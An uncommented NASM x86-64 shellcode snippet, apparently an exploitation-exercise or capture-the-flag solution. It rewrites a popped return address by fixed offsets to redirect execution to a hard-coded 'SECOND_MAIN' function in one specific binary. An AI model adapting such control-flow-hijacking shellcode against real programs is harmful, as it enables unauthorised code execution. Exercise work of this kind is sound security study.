[bits 64]
[org 0x0]

SECOND_MAIN equ 0x40069b
RETURN_ADDR equ 0x40072f
INITIAL_RAX equ 0x0a
NPUSH       equ 0x20

entry:
  pop rcx
  times (RETURN_ADDR - SECOND_MAIN) dec rcx
  times (INITIAL_RAX + 1) dec rax
  times (NPUSH) push rax
  call rcx

line_feed:
  db 0x0a
